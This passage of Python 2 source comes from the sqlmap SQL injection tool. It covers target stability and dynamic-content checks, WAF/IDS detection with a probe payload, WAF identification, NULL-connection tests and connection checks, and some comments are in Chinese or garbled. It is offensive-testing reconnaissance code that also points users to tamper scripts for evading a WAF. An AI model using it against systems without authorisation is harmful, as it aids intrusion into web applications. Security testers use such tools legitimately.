    result = None if dynResult is None else not dynResult
    kb.dynamicParameter = result

    return result

def checkDynamicContent(firstPage, secondPage):
    """
    This function checks for the dynamic content in the provided pages
    """

    if kb.nullConnection:
        debugMsg = "dynamic content checking skipped "
        debugMsg += "because NULL connection used"
        logger.debug(debugMsg)
        return

    if any(page is None for page in (firstPage, secondPage)):
        warnMsg = "can't check dynamic content "
        warnMsg += "because of lack of page content"
        logger.critical(warnMsg)
        return

    seqMatcher = getCurrentThreadData().seqMatcher
    seqMatcher.set_seq1(firstPage)
    seqMatcher.set_seq2(secondPage)

    # In case of an intolerable difference turn on dynamicity removal engine
    if seqMatcher.quick_ratio() <= UPPER_RATIO_BOUND:
        findDynamicContent(firstPage, secondPage)

        count = 0
        while not Request.queryPage():
            count += 1

            if count > conf.retries:
                warnMsg = "target URL is too dynamic. "
                warnMsg += "Switching to '--text-only' "
                logger.warn(warnMsg)

                conf.textOnly = True
                return

            warnMsg = "target URL is heavily dynamic"
            warnMsg += ". sqlmap is going to retry the request"
            logger.critical(warnMsg)

            secondPage, _ = Request.queryPage(content=True)
            findDynamicContent(firstPage, secondPage)

def checkStability():
    """
    This function checks if the URL content is stable requesting the
    same page two times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """

    infoMsg = "testing if the target URL is stable. This can take a couple of seconds"
    logger.info(infoMsg)

    firstPage = kb.originalPage  # set inside checkConnection()
    time.sleep(1)
    secondPage, _ = Request.queryPage(content=True, raise404=False)

    if kb.redirectChoice:
        return None

    kb.pageStable = (firstPage == secondPage)

    if kb.pageStable:
        if firstPage:
            infoMsg = "target URL is stable"
            logger.info(infoMsg)
        else:
            errMsg = "there was an error checking the stability of page "
            errMsg += "because of lack of content. Please check the "
            errMsg += "page request results (and probable errors) by "
            errMsg += "using higher verbosity levels"
            logger.error(errMsg)

    else:
        warnMsg = "target URL is not stable. sqlmap will base the page "
        warnMsg += "comparison on a sequence matcher. If no dynamic nor "
        warnMsg += "injectable parameters are detected, or in case of "
        warnMsg += "junk results, refer to user's manual paragraph "
        warnMsg += "'Page comparison' and provide a string or regular "
        warnMsg += "expression to match on"
        logger.warn(warnMsg)

        message = "how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] "
        test = readInput(message, default="C")

        if test and test[0] in ("q", "Q"):
            raise SqlmapUserQuitException

        elif test and test[0] in ("s", "S"):
            showStaticWords(firstPage, secondPage)

            message = "please enter value for parameter 'string': "
            test = readInput(message)

            if test:
                conf.string = test

                if kb.nullConnection:
                    debugMsg = "turning off NULL connection "
                    debugMsg += "support because of string checking"
                    logger.debug(debugMsg)

                    kb.nullConnection = None
            else:
                errMsg = "Empty value supplied"
                raise SqlmapNoneDataException(errMsg)

        elif test and test[0] in ("r", "R"):
            message = "please enter value for parameter 'regex': "
            test = readInput(message)

            if test:
                conf.regex = test

                if kb.nullConnection:
                    debugMsg = "turning off NULL connection "
                    debugMsg += "support because of regex checking"
                    logger.debug(debugMsg)

                    kb.nullConnection = None
            else:
                errMsg = "Empty value supplied"
                raise SqlmapNoneDataException(errMsg)

        else:
            checkDynamicContent(firstPage, secondPage)

    return kb.pageStable

def checkString():
    if not conf.string:
        return True

    infoMsg = "testing if the provided string is within the "
    infoMsg += "target URL page content"
    logger.info(infoMsg)

    page, headers = Request.queryPage(content=True)
    rawResponse = "%s%s" % (listToStrValue(headers.headers if headers else ""), page)

    if conf.string not in rawResponse:
        warnMsg = "you provided '%s' as the string to " % conf.string
        warnMsg += "match, but such a string is not within the target "
        warnMsg += "URL raw response, sqlmap will carry on anyway"
        logger.warn(warnMsg)

    return True

def checkRegexp():
    if not conf.regexp:
        return True

    infoMsg = "testing if the provided regular expression matches within "
    infoMsg += "the target URL page content"
    logger.info(infoMsg)

    page, headers = Request.queryPage(content=True)
    rawResponse = "%s%s" % (listToStrValue(headers.headers if headers else ""), page)

    if not re.search(conf.regexp, rawResponse, re.I | re.M):
        warnMsg = "you provided '%s' as the regular expression to " % conf.regexp
        warnMsg += "match, but such a regular expression does not have any "
        warnMsg += "match within the target URL raw response, sqlmap "
        warnMsg += "will carry on anyway"
        logger.warn(warnMsg)

    return True

def checkWaf():
    """
    Reference: http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse #waf ��ⷽ��
    #
    """
    if not conf.checkWaf:
        return False

    infoMsg = "heuristically checking if the target is protected by "
    infoMsg += "some kind of WAF/IPS/IDS" # 一些检查如果目标是保护某种WAF IDS / IPS /
    logger.info(infoMsg)

    retVal = False

    backup = dict(conf.parameters)

    payload = "%d %s" % (randomInt(), IDS_WAF_CHECK_PAYLOAD)

    conf.parameters = dict(backup)
    conf.parameters[PLACE.GET] = "" if not conf.parameters.get(PLACE.GET) else conf.parameters[PLACE.GET] + "&"
    conf.parameters[PLACE.GET] += "%s=%s" % (randomStr(), payload)

    logger.log(CUSTOM_LOGGING.PAYLOAD, payload)

    kb.matchRatio = None
    Request.queryPage()

    if kb.errorIsNone and kb.matchRatio is None:
        kb.matchRatio = LOWER_RATIO_BOUND

    conf.parameters = dict(backup)
    conf.parameters[PLACE.GET] = "" if not conf.parameters.get(PLACE.GET) else conf.parameters[PLACE.GET] + "&"
    conf.parameters[PLACE.GET] += "%s=%d" % (randomStr(), randomInt())

    trueResult = Request.queryPage()

    if trueResult:
        conf.parameters = dict(backup)
        conf.parameters[PLACE.GET] = "" if not conf.parameters.get(PLACE.GET) else conf.parameters[PLACE.GET] + "&"
        conf.parameters[PLACE.GET] += "%s=%d %s" % (randomStr(), randomInt(), IDS_WAF_CHECK_PAYLOAD)

        falseResult = Request.queryPage()

        if not falseResult:
            retVal = True

    conf.parameters = dict(backup)

    if retVal:
        warnMsg = "it appears that the target is protected. Please "
        warnMsg += "consider usage of tamper scripts (option '--tamper')" #看来,目标是保护。请考虑使用夯脚本(选项--tamper)”
        logger.warn(warnMsg)
    else:
        infoMsg = "it appears that the target is not protected" #看来,目标不受保护
        logger.info(infoMsg)

    return retVal

def identifyWaf(): #ssqlmap的参数–identify-waf
    if not conf.identifyWaf:
        return None

    kb.testMode = True

    infoMsg = "using WAF scripts to detect " #一些检查如果目标是保护某种WAF IDS / IPS /
    infoMsg += "backend WAF/IPS/IDS protection" 
    logger.info(infoMsg)

    @cachedmethod
    def _(*args, **kwargs):
        page, headers, code = None, None, None
        try:
            if kwargs.get("get"):
                kwargs["get"] = urlencode(kwargs["get"])
            kwargs["raise404"] = False
            kwargs["silent"] = True
            page, headers, code = Request.getPage(*args, **kwargs)
        except Exception:
            pass
        return page or "", headers or {}, code

    retVal = False

    for function, product in kb.wafFunctions:
        try:
            logger.debug("checking for WAF/IDS/IPS product '%s'" % product)
            found = function(_)
        except Exception, ex:
            errMsg = "exception occurred while running "
            errMsg += "WAF script for '%s' ('%s')" % (product, ex)
            logger.critical(errMsg)

            found = False

        if found:
            retVal = product
            break

    if retVal:
        errMsg = "WAF/IDS/IPS identified '%s'. Please " % retVal
        errMsg += "consider usage of tamper scripts (option '--tamper')"
        logger.critical(errMsg)

        message = "are you sure that you want to " #��ȷ����Ҫ������һ����Ŀ�������?[y / N]
        message += "continue with further target testing? [y/N] "
        output = readInput(message, default="N")

        if output and output[0] not in ("Y", "y"):
            raise SqlmapUserQuitException
    else:
        infoMsg = "no WAF/IDS/IPS product has been identified" #û��WAF / IDS / IPS��Ʒ�ѱ�ȷ��
        logger.info(infoMsg)

    kb.testMode = False

    return retVal

def checkNullConnection():
    """
    Reference: http://www.wisec.it/sectou.php?id=472f952d79293
    """

    if conf.data:
        return False

    infoMsg = "testing NULL connection to the target URL"
    logger.info(infoMsg)

    pushValue(kb.pageCompress)
    kb.pageCompress = False

    try:
        page, headers, _ = Request.getPage(method=HTTPMETHOD.HEAD)

        if not page and HTTP_HEADER.CONTENT_LENGTH in (headers or {}):
            kb.nullConnection = NULLCONNECTION.HEAD

            infoMsg = "NULL connection is supported with HEAD header"
            logger.info(infoMsg)
        else:
            page, headers, _ = Request.getPage(auxHeaders={HTTP_HEADER.RANGE: "bytes=-1"})

            if page and len(page) == 1 and HTTP_HEADER.CONTENT_RANGE in (headers or {}):
                kb.nullConnection = NULLCONNECTION.RANGE

                infoMsg = "NULL connection is supported with GET header "
                infoMsg += "'%s'" % kb.nullConnection
                logger.info(infoMsg)
            else:
                _, headers, _ = Request.getPage(skipRead = True)

                if HTTP_HEADER.CONTENT_LENGTH in (headers or {}):
                    kb.nullConnection = NULLCONNECTION.SKIP_READ

                    infoMsg = "NULL connection is supported with 'skip-read' method"
                    logger.info(infoMsg)

    except SqlmapConnectionException, errMsg:
        errMsg = getUnicode(errMsg)
        raise SqlmapConnectionException(errMsg)

    kb.pageCompress = popValue()

    return kb.nullConnection is not None

def checkConnection(suppressOutput=False):
    if not any((conf.proxy, conf.tor, conf.dummy)):
        try:
            socket.getaddrinfo(conf.hostname, None)
        except socket.gaierror:
            errMsg = "host '%s' does not exist" % conf.hostname
            raise SqlmapConnectionException(errMsg)
        except socket.error, ex:
            errMsg = "problem occurred while "
            errMsg += "resolving a host name '%s' ('%s')" % (conf.hostname, str(ex))
            raise SqlmapConnectionException(errMsg)

    if not suppressOutput and not conf.dummy:
        infoMsg = "testing connection to the target URL"
        logger.info(infoMsg)

    try:
        page, _ = Request.queryPage(content=True, noteResponseTime=False)
        kb.originalPage = kb.pageTemplate = page

        kb.errorIsNone = False

        if not kb.originalPage and wasLastResponseHTTPError():
            errMsg = "unable to retrieve page content"
            raise SqlmapConnectionException(errMsg)
        elif wasLastResponseDBMSError():
            warnMsg = "there is a DBMS error found in the HTTP response body "
            warnMsg += "which could interfere with the results of the tests"
            logger.warn(warnMsg)
        elif wasLastResponseHTTPError():
            warnMsg = "the web server responded with an HTTP error code (%d) " % getLastRequestHTTPError()
            warnMsg += "which could interfere with the results of the tests"
            logger.warn(warnMsg)
        else:
            kb.errorIsNone = True

    except SqlmapConnectionException, errMsg:
        errMsg = getUnicode(errMsg)
        logger.critical(errMsg)

        if conf.ipv6:
            warnMsg = "check connection to a provided "
            warnMsg += "IPv6 address with a tool like ping6 "
            warnMsg += "(e.g. 'ping6 -I eth0 %s') " % conf.hostname
            warnMsg += "prior to running sqlmap to avoid "
            warnMsg += "any addressing issues"
            singleTimeWarnMessage(warnMsg)

        if any(code in kb.httpErrorCodes for code in (httplib.NOT_FOUND, )):
            if conf.multipleTargets:
                return False

            msg = "it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] "
            if readInput(msg, default="Y") not in ("n", "N"):
                raise SqlmapSilentQuitException
            else:
                kb.ignoreNotFound = True
        else:
            raise

    return True
